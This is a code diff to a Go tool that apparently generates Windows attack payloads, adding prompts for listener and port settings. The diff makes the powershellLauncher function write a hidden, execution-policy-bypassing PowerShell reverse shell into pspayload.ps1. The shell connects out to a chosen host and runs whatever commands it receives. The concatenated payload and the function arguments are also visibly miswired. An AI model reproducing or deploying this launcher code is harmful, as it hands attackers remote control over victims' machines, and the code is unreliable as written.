@@ -33,6 +33,7 @@ type promptWindowsContent struct {
 	remoteIP    string
 	listener    string
 	listenerIP  string
+	remotePort  string
 	Jitter      string
 	payloadType string
 }
@@ -102,7 +103,7 @@ func createWindowsPayload() {
 		"Please enter in the remote IP: ",
 		"Remote IP: ",
 	}
-	payloadName := promptGetWindowsInput(payloadNamePromptContent)
+	remoteIP := promptGetWindowsInput(payloadNamePromptContent)
 
 	//payload type
 	windowsPayloadPromptContent := promptContent{
@@ -110,21 +111,28 @@ func createWindowsPayload() {
 		"Listener: ",
 	}
 
-	payload := promptGetWindowsInput(windowsPayloadPromptContent)
+	listener := promptGetWindowsInput(windowsPayloadPromptContent)
 
-	definitionJitter := promptContent{
+	definitionListenerIP := promptContent{
 		"Please choose a local IP",
 		"LHOST: ",
 	}
 
-	jitter := promptGetWindowsInput(definitionJitter)
+	listenerIP := promptGetWindowsInput(definitionListenerIP)
 
-	definitionListenerIP := promptContent{
+	definitionRemotePort := promptContent{
+		"Please choose a remote port",
+		"RPORT: ",
+	}
+
+	remotePort := promptGetWindowsInput(definitionRemotePort)
+
+	definitionJitter := promptContent{
 		"Please enter a jitter percentage",
 		"Please enter desired jitter percentage: %",
 	}
 
-	listenerIP := promptGetWindowsInput(definitionListenerIP)
+	jitter := promptGetWindowsInput(definitionJitter)
 
 	definitionPayloadType := promptContent{
 		"Please enter a payload type",
@@ -133,15 +141,14 @@ func createWindowsPayload() {
 
 	payloadType := promptWindowsSelect(definitionPayloadType)
 
-	data.InsertLauncher(payloadName, payload, jitter, listenerIP, payloadType)
-
+	data.InsertLauncher(remoteIP, listener, listenerIP, remotePort, remoteIP, jitter)
 	//convert to switch statement at some point
 	if payloadType != "" {
 		if payloadType == "exe" {
 			print("generating executable launcher...\n")
 		} else if payloadType == "powershell" {
 			print("generating powershell launcher...\n")
-			powershellLauncher()
+			powershellLauncher(remoteIP, remotePort)
 		} else if payloadType == "batch" {
 			print("generating batch (cmd) launcher...\n")
 		}
@@ -151,7 +158,7 @@ func createWindowsPayload() {
 }
 
 /* PowerShell */
-func powershellLauncher() {
+func powershellLauncher(listenerIP string, remotePort string) {
 
 	/* Create pspayload.ps1 file and place in inside of the lauchers folder */
 	path := filepath.Join("launchers", "pspayload.ps1")
@@ -162,8 +169,10 @@ func powershellLauncher() {
 	}
 
 	/* Generate the code for the file */
-	val := "old falcon\n"
-	data := []byte(val)
+	val := `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient`
+	val2 := `("` + listenerIP + `",` + remotePort + ");"
+	val3 := `$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()`
+	data := []byte(val + val2 + val3)
 
 	err2 := ioutil.WriteFile("launchers/"+"pspayload.ps1", data, 0)
 
